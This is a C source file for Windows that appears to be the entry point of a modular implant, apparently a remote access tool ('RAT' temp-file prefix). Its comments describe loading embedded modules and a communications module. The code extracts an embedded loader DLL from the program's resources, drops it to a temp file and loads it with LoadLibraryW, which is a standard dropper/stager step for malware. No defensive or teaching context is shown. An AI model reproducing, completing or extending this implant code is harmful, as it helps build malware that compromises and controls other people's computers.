#include <Windows.h>

#include <stdio.h>

#include "ModularImplant.h"

BOOL
LoadEmbeddedLoader(VOID);

BOOL
WriteDataToFile(LPCWSTR wszFileName, PVOID pData, DWORD dwDataLen);

INT
wmain(INT argc, PWSTR argv[])
{
	/*
	* Implant should:
	*	1. Load embedded modules from resources
	*	2. Load comms module using loader
	*/
	LoadEmbeddedLoader();

	return EXIT_SUCCESS;
}

BOOL
LoadEmbeddedLoader(VOID)
{
	HRSRC hrsrcLoader = NULL;
	HGLOBAL hgLoader = NULL;
	PVOID lpLoaderData = NULL;
	DWORD dwLoaderSize = NULL;
	WCHAR awTempFileName[MAX_PATH] = { 0 };
	HMODULE hmLoader = NULL;

	if (FALSE == GetTempFileNameW(L".", L"RAT", 0, awTempFileName))
	{
		LOG_ERROR("GetTempFileName failed");
		return FALSE;
	}

	hrsrcLoader = FindResourceW(NULL, MAKEINTRESOURCEW(Loader), RT_RCDATA);
	if (NULL == hrsrcLoader)
	{
		LOG_ERROR("FindResource failed");
		return FALSE;
	}

	hgLoader = LoadResource(NULL, hrsrcLoader);
	if (NULL == hgLoader)
	{
		LOG_ERROR("LoadResource failed")
		return FALSE;
	}

	dwLoaderSize = SizeofResource(NULL, hrsrcLoader);
	if (0 == dwLoaderSize)
	{
		LOG_ERROR("SizeofResource failed");
		return FALSE;
	}

	lpLoaderData = LockResource(hgLoader);
	if (NULL == lpLoaderData)
	{
		LOG_ERROR("LockResource failed");
		return FALSE;
	}

	if (FALSE == WriteDataToFile(awTempFileName, lpLoaderData, dwLoaderSize))
	{
		return FALSE;
	}

	hmLoader = LoadLibraryW(awTempFileName);
	if (NULL == hmLoader)
	{
		LOG_ERROR("LoadLibrary failed");
	}

	return TRUE;
}

BOOL
WriteDataToFile(LPCWSTR wszFileName, PVOID pData, DWORD dwDataLen)
{
	BOOL fReturn = FALSE;
	HANDLE hTempFile = INVALID_HANDLE_VALUE;
	DWORD cbBytesWritten = 0;

	hTempFile = CreateFileW(wszFileName,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		0,
		NULL);
	if (INVALID_HANDLE_VALUE == hTempFile)
	{
		LOG_ERROR("CreateFile failed");
		return FALSE;
	}

	if (FALSE == WriteFile(hTempFile,
		pData,
		dwDataLen,
		&cbBytesWritten,
		NULL))
	{
		LOG_ERROR("WriteFile failed");
		CloseHandle(hTempFile);
		return FALSE;
	}

	CloseHandle(hTempFile);

	return TRUE;
}